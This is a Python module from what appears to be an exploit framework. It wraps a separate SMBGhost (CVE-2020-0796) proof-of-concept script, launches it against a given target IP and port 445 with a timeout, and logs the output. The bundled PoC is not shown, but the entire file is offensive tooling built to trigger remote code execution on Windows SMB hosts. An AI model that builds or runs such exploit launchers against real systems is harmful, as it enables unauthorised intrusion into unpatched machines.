# File: modules/exploit_lib/cve_2020_0796.py

"""
SMBGhost RCE exploit (CVE-2020-0796) wrapper around smbghost_poc.py.
(Fixed missing import, improved path resolution and timeout handling.)
"""

import logging
import subprocess
from pathlib import Path    # <-- added
from bismillah import log_event

logger = logging.getLogger("cve_2020_0796")

def exploit(target: str, port: int = 445, timeout: int = 120) -> dict:
    """
    target: "192.168.1.20"
    port: 445
    Attempts to trigger the SMBGhost PoC.
    """
    try:
        poc_path = Path(__file__).parent / "smbghost_poc.py"
        if not poc_path.exists():
            raise FileNotFoundError(f"PoC script not found: {poc_path}")
        cmd = ["python3", str(poc_path), target, str(port)]
        logger.info(f"[+] Running SMBGhost PoC: {' '.join(cmd)}")
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode()
        log_event("cve_2020_0796", f"Exploit output: {output}".encode())
        return {"status": "ok", "output": output}
    except subprocess.TimeoutExpired:
        logger.error("[-] SMBGhost PoC timed out")
        return {"status": "error", "detail": "Timeout expired"}
    except Exception as e:
        logger.error(f"[-] SMBGhost exploit failed: {e}")
        return {"status": "error", "detail": str(e)}
